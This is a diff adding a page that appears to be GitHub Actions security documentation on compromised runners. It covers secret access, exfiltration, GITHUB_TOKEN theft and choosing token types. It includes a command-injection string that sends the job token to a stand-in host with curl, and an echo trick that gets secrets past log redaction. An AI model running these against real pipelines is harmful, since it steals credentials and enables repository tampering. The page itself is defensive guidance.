@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>Compromised runners</title>
+    <link rel="stylesheet" href="../../../../assets/style.css">
+  </head>
+  <body class="markdown-body">
+    <nav><a href="../../index.html">GitHub Actions</a> / <a href="../index.html">Concepts</a> / <a href="index.html">Security</a> / </nav><h1>
+<a href="#compromised-runners" aria-hidden="true" class="anchor" id="compromised-runners"></a>Compromised runners</h1>
+<p>Understand the security risks associated with compromised GitHub Actions runners.</p>
+<h2 title="Potential impact of a compromised runner">
+<a href="#potential-impact-of-a-compromised-runner" aria-hidden="true" class="anchor" id="potential-impact-of-a-compromised-runner"></a>Potential impact of a compromised runner</h2>
+<p>These sections consider some of the steps an attacker can take if they're able to run malicious commands on a GitHub Actions runner.</p>
+<div class="markdown-alert markdown-alert-note">
+<p class="markdown-alert-title">Note</p>
+<p>GitHub-hosted runners do not scan for malicious code downloaded by a user during their job, such as a compromised third party library.</p>
+</div>
+<h3 title="Potential impact of a compromised runner / Accessing secrets">
+<a href="#accessing-secrets" aria-hidden="true" class="anchor" id="accessing-secrets"></a>Accessing secrets</h3>
+<p>Workflows triggered from a forked repository using the <code>pull_request</code> event have read-only permissions and have no access to secrets. However, these permissions differ for various event triggers such as <code>issue_comment</code>, <code>issues</code>, <code>push</code> and <code>pull_request</code> from a branch within the repository, where the attacker could attempt to steal repository secrets or use the write permission of the job's <a href="github_token.html"><code>GITHUB_TOKEN</code></a>.</p>
+<ul>
+<li>
+<p>If the secret or token is set to an environment variable, it can be directly accessed through the environment using <code>printenv</code>.</p>
+</li>
+<li>
+<p>If the secret is used directly in an expression, the generated shell script is stored on-disk and is accessible.</p>
+</li>
+<li>
+<p>For a custom action, the risk can vary depending on how a program is using the secret it obtained from the argument:</p>
+<pre lang="yaml" style="background-color:#2b303b;"><code><span style="color:#bf616a;">uses</span><span style="color:#c0c5ce;">: </span><span style="color:#a3be8c;">fakeaction/publish@v3
+</span><span style="color:#bf616a;">with</span><span style="color:#c0c5ce;">:
+</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">key</span><span style="color:#c0c5ce;">: </span><span style="color:#a3be8c;">${{ secrets.PUBLISH_KEY }}
+</span></code></pre>
+</li>
+</ul>
+<p>Although GitHub Actions scrubs secrets from memory that are not referenced in the workflow (or an included action), the <code>GITHUB_TOKEN</code> and any referenced secrets can be harvested by a determined attacker.</p>
+<h3 title="Potential impact of a compromised runner / Exfiltrating data from a runner">
+<a href="#exfiltrating-data-from-a-runner" aria-hidden="true" class="anchor" id="exfiltrating-data-from-a-runner"></a>Exfiltrating data from a runner</h3>
+<p>An attacker can exfiltrate any stolen secrets or other data from the runner. To help prevent accidental secret disclosure, GitHub Actions <a href="../../how-tos/write-workflows/choose-what-workflows-do/use-secrets.html#accessing-your-secrets">automatically redact secrets printed to the log</a>, but this is not a true security boundary because secrets can be intentionally sent to the log. For example, obfuscated secrets can be exfiltrated using <code>echo ${SOME_SECRET:0:4}; echo ${SOME_SECRET:4:200};</code>. In addition, since the attacker may run arbitrary commands, they could use HTTP requests to send secrets or other repository data to an external server.</p>
+<h3 title="Potential impact of a compromised runner / Stealing the job's GITHUB_TOKEN">
+<a href="#stealing-the-jobs-github_token" aria-hidden="true" class="anchor" id="stealing-the-jobs-github_token"></a>Stealing the job's <code>GITHUB_TOKEN</code>
+</h3>
+<p>It is possible for an attacker to steal a job's <code>GITHUB_TOKEN</code>. The GitHub Actions runner automatically receives a generated <code>GITHUB_TOKEN</code> with permissions that are limited to just the repository that contains the workflow, and the token expires after the job has completed. Once expired, the token is no longer useful to an attacker. To work around this limitation, they can automate the attack and perform it in fractions of a second by calling an attacker-controlled server with the token, for example: <code>a"; set +e; curl http://example.com?token=$GITHUB_TOKEN;#</code>.</p>
+<h3 title="Potential impact of a compromised runner / Modifying the contents of a repository">
+<a href="#modifying-the-contents-of-a-repository" aria-hidden="true" class="anchor" id="modifying-the-contents-of-a-repository"></a>Modifying the contents of a repository</h3>
+<p>The attacker server can use the GitHub API to <a href="../../reference/workflows-and-actions/workflow-syntax.html#permissions">modify repository content</a>, including releases, if the assigned permissions of <code>GITHUB_TOKEN</code> <a href="../../tutorials/authenticate-with-github_token.html#modifying-the-permissions-for-the-github_token">are not restricted</a>.</p>
+<h3 title="Potential impact of a compromised runner / Cross-repository access">
+<a href="#cross-repository-access" aria-hidden="true" class="anchor" id="cross-repository-access"></a>Cross-repository access</h3>
+<p>GitHub Actions is intentionally scoped for a single repository at a time. The <code>GITHUB_TOKEN</code> grants the same level of access as a write-access user, because any write-access user can access this token by creating or modifying a workflow file, elevating the permissions of the <code>GITHUB_TOKEN</code> if necessary. Users have specific permissions for each repository, so allowing the <code>GITHUB_TOKEN</code> for one repository to grant access to another would impact the GitHub permission model if not implemented carefully. Similarly, caution must be taken when adding GitHub authentication tokens to a workflow, because this can also affect the GitHub permission model by inadvertently granting broad access to collaborators.</p>
+<p>If your organization is owned by an enterprise account, then you can share and reuse GitHub Actions by storing them in internal repositories. For more information, see <a href="https://docs.github.com/en/enterprise-cloud@latest/actions/how-tos/reuse-automations/share-with-your-enterprise" class="external">Sharing actions and workflows with your enterprise</a>.</p>
+<p>You can perform other privileged, cross-repository interactions by referencing a GitHub authentication token or SSH key as a secret within the workflow. Because many authentication token types do not allow for granular access to specific resources, there is significant risk in using the wrong token type, as it can grant much broader access than intended.</p>
+<p>This list describes the recommended approaches for accessing repository data within a workflow, in descending order of preference:</p>
+<ol>
+<li>
+<strong>The <code>GITHUB_TOKEN</code></strong>
+<ul>
+<li>This token is intentionally scoped to the single repository that invoked the workflow, and can have the same level of access as a write-access user on the repository. The token is created before each job begins and expires when the job is finished. For more information, see <a href="../../tutorials/authenticate-with-github_token.html">Use GITHUB<span data-escaped-char>\</span><span data-escaped-char>_</span>TOKEN for authentication in workflows</a>.</li>
+<li>The <code>GITHUB_TOKEN</code> should be used whenever possible.</li>
+</ul>
+</li>
+<li>
+<strong>Repository deploy key</strong>
+<ul>
+<li>Deploy keys are one of the only credential types that grant read or write access to a single repository, and can be used to interact with another repository within a workflow. For more information, see <a href="https://docs.github.com/en/authentication/connecting-to-github-with-ssh/managing-deploy-keys#deploy-keys" class="external">Managing deploy keys</a>.</li>
+<li>Note that deploy keys can only clone and push to the repository using Git, and cannot be used to interact with the REST or GraphQL API, so they may not be appropriate for your requirements.</li>
+</ul>
+</li>
+<li>
+<strong>GitHub App tokens</strong>
+<ul>
+<li>GitHub Apps can be installed on select repositories, and even have granular permissions on the resources within them. You could create a GitHub App internal to your organization, install it on the repositories you need access to within your workflow, and authenticate as the installation within your workflow to access those repositories. For more information, see <a href="https://docs.github.com/en/apps/creating-github-apps/guides/making-authenticated-api-requests-with-a-github-app-in-a-github-actions-workflow" class="external">Making authenticated API requests with a GitHub App in a GitHub Actions workflow</a>.</li>
+</ul>
+</li>
+<li>
+<strong>personal access tokens</strong>
+<ul>
+<li>You should never use a personal access token (classic). These tokens grant access to all repositories within the organizations that you have access to, as well as all personal repositories in your personal account. This indirectly grants broad access to all write-access users of the repository the workflow is in.</li>
+<li>If you do use a personal access token, you should never use a personal access token from your own account. If you later leave an organization, workflows using this token will immediately break, and debugging this issue can be challenging. Instead, you should use a fine-grained personal access token for a new account that belongs to your organization and that is only granted access to the specific repositories that are needed for the workflow. Note that this approach is not scalable and should be avoided in favor of alternatives, such as deploy keys.</li>
+</ul>
+</li>
+<li>
+<strong>SSH keys on a personal account</strong>
+<ul>
+<li>Workflows should never use the SSH keys on a personal account. Similar to personal access tokens (classic), they grant read/write permissions to all of your personal repositories as well as all the repositories you have access to through organization membership. This indirectly grants broad access to all write-access users of the repository the workflow is in. If you're intending to use an SSH key because you only need to perform repository clones or pushes, and do not need to interact with public APIs, then you should use individual deploy keys instead.</li>
+</ul>
+</li>
+</ol>
+<h2 title="Next steps">
+<a href="#next-steps" aria-hidden="true" class="anchor" id="next-steps"></a>Next steps</h2>
+<p>For security best practices with GitHub Actions, see <a href="../../reference/security/secure-use.html">Secure use reference</a>.</p>
+
+
+    <footer>
+      Documentation is licensed under Creative Commons Attribution 4.0
+      (see <a href="../../../../GitHub documentation LICENSE.txt">GitHub documentation LICENSE</a>)
+    </footer>
+  </body>
+</html>
